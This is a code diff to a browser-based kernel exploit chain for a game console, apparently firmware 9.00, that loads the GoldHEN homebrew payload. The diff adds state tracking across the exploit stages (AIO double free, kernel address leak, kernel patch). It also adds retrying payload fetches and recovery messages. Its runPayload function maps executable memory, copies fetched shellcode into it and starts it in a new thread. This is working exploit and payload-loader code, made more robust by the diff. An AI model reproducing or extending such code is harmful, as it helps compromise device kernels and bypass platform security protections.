@@ -1683,6 +1683,8 @@ function setup(block_fd) {
 // * corrupt a pipe for arbitrary r/w
 //
 // the exploit implementation also assumes that we are pinned to one core
+let kernelState = 'pristine';
+
 export async function kexploit() {
     const _init_t1 = performance.now();
     await init();
@@ -1735,6 +1737,7 @@ export async function kexploit() {
         [block_id, groom_ids] = setup(block_fd);
 
         log('\nSTAGE: Double free AIO queue entry');
+        kernelState = 'mutating';
         const sd_pair = double_free_reqs2(sds);
 
         log('\nSTAGE: Leak kernel addresses');
@@ -1748,6 +1751,7 @@ export async function kexploit() {
 
         log('\nSTAGE: Patch kernel');
         await patch_kernel(kbase, kmem, p_ucred, restore_info);
+        kernelState = 'patched';
         
     } finally {
         close(unblock_fd);
@@ -1798,42 +1802,55 @@ function array_from_address(addr, size) {
     return og_array;
 }
 
-function runPayload(PLfile) {
+async function runPayload(PLfile) {
   var loader_addr = chain.sysp('mmap', 0, 0x1000, 7, 0x41000, -1, 0);
   var tmpStubArray = array_from_address(loader_addr, 1);
   tmpStubArray[0] = 0x00C3E7FF;
-
-  var req = new XMLHttpRequest();
-  req.responseType = "arraybuffer";
-  req.open('GET', PLfile);
-  req.send();
-
-  req.onreadystatechange = function () {
-    if (req.readyState == 4) {
-      if (req.status === 200 && req.response) {
-        var PLD = req.response;
-        var payload_buffer = chain.sysp('mmap', 0, PLD.byteLength * 4, 7, 0x1002, -1, 0);
-        var pl = array_from_address(payload_buffer, PLD.byteLength * 4);
-        var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
-        var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
-        tmp.set(new Uint8Array(req.response), 0);
-        tmp.set(padding, req.response.byteLength);
-        var shellcode = new Uint32Array(tmp.buffer);
-        pl.set(shellcode, 0);
-        var pthread = malloc(0x10);
-
-        call_nze('pthread_create', pthread, 0, loader_addr, payload_buffer);
-      }
-    }
-  };
+  var PLD = window.GoodGameHost
+    ? await GoodGameHost.loadBinary(PLfile, {
+        attempts: 5,
+        timeout: 12000,
+        expectedBytes: 293120,
+        retryDelay: 400,
+      })
+    : await (await fetch(PLfile)).arrayBuffer();
+  var paddingLength = (4 - (PLD.byteLength % 4)) % 4;
+  var payload_buffer = chain.sysp('mmap', 0, PLD.byteLength + paddingLength, 7, 0x1002, -1, 0);
+  var pl = array_from_address(payload_buffer, (PLD.byteLength + paddingLength) / 4);
+  var tmp = new Uint8Array(PLD.byteLength + paddingLength);
+  tmp.set(new Uint8Array(PLD), 0);
+  var shellcode = new Uint32Array(tmp.buffer);
+  pl.set(shellcode, 0);
+  var pthread = malloc(0x10);
+  call_nze('pthread_create', pthread, 0, loader_addr, payload_buffer);
 }
 
-kexploit().then(() => {
-	setTimeout(() => {
-		runPayload("./goldhen_2.4b18.12.bin");
-		msgs.innerHTML = "GoldHEN v2.4b18.12 Loaded ...";
-	},500);
-}).catch(() => {
-    msgs.innerHTML = "Failed to Load! Restart Your Console ...";
-	msgs.style.color = "yellow";
-});
+async function launchGoldHEN() {
+    try {
+        await kexploit();
+        if (window.GoodGameHost) GoodGameHost.clearRetry('fw900-kernel-prep');
+    } catch (error) {
+        log(`kernel exploit failed in state ${kernelState}: ${error}`);
+        if (kernelState === 'pristine' && window.GoodGameHost
+            && GoodGameHost.safeReload('fw900-kernel-prep', 'kernel-prep', 2, 1200)) {
+            return;
+        }
+        msgs.innerHTML = kernelState === 'pristine'
+            ? 'Safe retry stopped. Close and reopen the browser — no console restart.'
+            : 'Kernel stage was interrupted. Restart the console before trying again.';
+        msgs.style.color = '#ffd45a';
+        return;
+    }
+
+    try {
+        msgs.innerHTML = 'Loading GoldHEN payload...';
+        await runPayload('./goldhen_2.4b18.12.bin');
+        msgs.innerHTML = 'GoldHEN v2.4b18.12 Loaded ...';
+    } catch (error) {
+        log(`payload failed after retries: ${error}`);
+        msgs.innerHTML = 'GoldHEN file could not be loaded. Reopen the browser — console restart is not required.';
+        msgs.style.color = '#ffd45a';
+    }
+}
+
+launchGoldHEN();
